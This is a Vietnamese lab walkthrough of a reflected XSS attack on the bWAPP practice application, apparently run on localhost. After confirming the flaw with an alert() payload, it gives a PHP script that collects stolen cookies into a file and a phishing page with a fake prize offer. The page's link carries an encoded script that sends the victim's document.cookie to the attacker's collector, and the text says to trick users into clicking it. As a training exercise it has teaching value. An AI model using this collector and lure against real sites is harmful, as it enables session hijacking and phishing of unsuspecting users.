Bước 1: Xác định vị trí có thể dính XSS
Thử nhập họ tên và nhận được kết quả

![image](https://github.com/user-attachments/assets/34804180-fbab-4493-b02e-6a7296ad0bb2)

Kết quả trả về hiển thị ‘ Welcome Tran Van Thiep’. Từ đó có thể xác định có
khả năng bị dính lỗi XSS

Do là hoạt động theo phương thức GET nên có thể thấy dữ liệu được truyền đi 
kèm theo URL.

![image](https://github.com/user-attachments/assets/b2a93875-390a-4994-8316-65c6e540112f)

Bước 2: Kiểm tra lỗi XSS

Sau khi đã xác định được vị trí có khả năng mắc lỗi XSS, tiến hành kiểm tra 
bằng cách thử truyền vào 1 đoạn mã java script **<script>alert("XSS")</script>** để
thực hiện tạo 1 popup thông báo để kiểm tra xem site có bị lỗi XSS hay không?

![image](https://github.com/user-attachments/assets/8867814d-0762-40c0-a74a-6ec7c2a0430c)

Vậy là đã chắc chắn web vulnerable với XSS, ta sẽ tiến hành khai thác bằng kỹ thuật đánh cắp cookie:

Code php crawl cookie:

```php
<?php
    if(isset($_GET['cookie']))
    {
        $cookie = $_GET['cookie'];
        // Mở file cookie.txt, tham số a nghĩa là file này mở chỉ để write chứ không scan hay read
        $f=fopen('cookie.txt','a');
        // Ta write địa chỉ trang web mà ở trang đó bị ta chèn script.
        fwrite($f,$_SERVER['HTTP_REFERER']);
        // Ghi giá trị cookie
        fwrite($f,". Cookie la: ".$cookie." \n");
        // Đóng file lại
        fclose($f);
    }
?>
```

* Tạo một url phishing
```html
<html>
  <head>
      <title>CHUC MUNG!!!</title>
  </head>
  <body>
      <h1 align="center">Bạn đã trúng tour du lịch vòng quanh Mỹ Đình</h1>
      <h1 align="center">-Mỹ Đình Bus-</h1>
  Xem thông tin chi tiết <a href='http://localhost/bwapp/xss_get.php?firstname=%3Cscript%3Ewindow.open%28%22http%3A%2F%2Flocalhost%2Fget.php%3Fcookie%3D%22%2Bdocument.cookie%29%3C%2Fscript%3E&lastname=Thiep&form=submit'>tai day</a> .
  </body>
</html>
```

Tiếp theo, lừa người dùng click vào link phishing

![image](https://github.com/user-attachments/assets/009dbf69-a15d-4145-be39-23f1c6a4b5ea)

Khi mục tiêu ấn click vào link sẽ bị chuyển hướng tới web đã bị đệm javascript, sau đó sẽ bị crawl cookie về cookie.txt tại máy attacker:

